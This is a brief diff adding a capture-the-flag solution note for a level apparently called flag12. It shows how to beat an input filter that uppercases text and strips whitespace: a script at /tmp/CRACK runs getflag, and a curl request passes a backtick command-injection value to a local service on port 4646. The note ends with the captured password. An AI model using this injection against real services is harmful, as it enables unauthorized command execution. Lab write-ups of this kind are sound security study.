@@ -1,0 +1,13 @@
+script capitilizes and deletes every isspace symbol from x input ($xx)
+so we need to create script with named in capital like /tmp/CRACK
+
+and pass it to the x variable generilizing the pass /*/CRACK
+
+cat /tmp/CRACK
+#!/bin/bash
+getflag > password
+
+curl 127.0.0.1:4646?x="\`/*/CRACK\`" to make sure it will be executed from flag12
+
+password: g1qKMiRpXf53AWhDaU7FEkczr
+
